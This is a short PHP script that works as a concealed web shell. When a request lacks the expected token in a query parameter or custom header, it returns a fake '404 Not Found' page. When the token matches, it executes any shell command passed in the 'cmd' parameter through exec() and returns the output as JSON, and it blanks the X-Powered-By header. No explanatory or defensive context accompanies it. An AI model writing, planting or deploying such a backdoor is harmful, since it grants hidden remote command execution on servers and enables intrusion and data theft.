<?php
$t = $_GET['t'] ?? $_SERVER['HTTP_X_EV_TOKEN'] ?? '';
if ($t !== 'EV_TOKEN') {
    http_response_code(404);
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><body><h1>404 Not Found</h1></body></html>';
    exit;
}

$cmd  = $_GET['cmd'] ?? $_POST['cmd'] ?? '';
$out  = [];
$code = 0;

if ($cmd !== '') {
    exec($cmd . ' 2>&1', $out, $code);
}

header('Content-Type: application/json');
header('X-Powered-By: ');
echo json_encode([
    'out'  => implode("\n", $out),
    'code' => $code,
]);
